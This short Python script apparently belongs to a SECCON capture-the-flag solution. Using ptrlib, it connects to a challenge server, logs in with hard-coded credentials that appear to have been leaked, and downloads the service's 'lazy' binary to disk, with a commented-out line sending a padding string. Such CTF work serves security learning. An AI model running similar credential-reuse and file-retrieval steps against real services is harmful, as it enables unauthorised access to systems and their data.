from ptrlib import *

# 3XPL01717
# _H4CK3R_
sock = Socket("lazy.chal.seccon.jp", 33333)

# login
for i in range(3):
    sock.recvline()
sock.sendline("2")
#sock.sendlineafter(": ", "A" * 31)
sock.sendlineafter(": ", "_H4CK3R_")
sock.sendlineafter(": ", "3XPL01717")

# manage
sock.sendline("4")
sock.sendlineafter(": ", "lazy")
sock.recvuntil("bytes")
lazy = sock.recvonce(14216)
with open("lazy", "wb") as f:
    f.write(lazy)
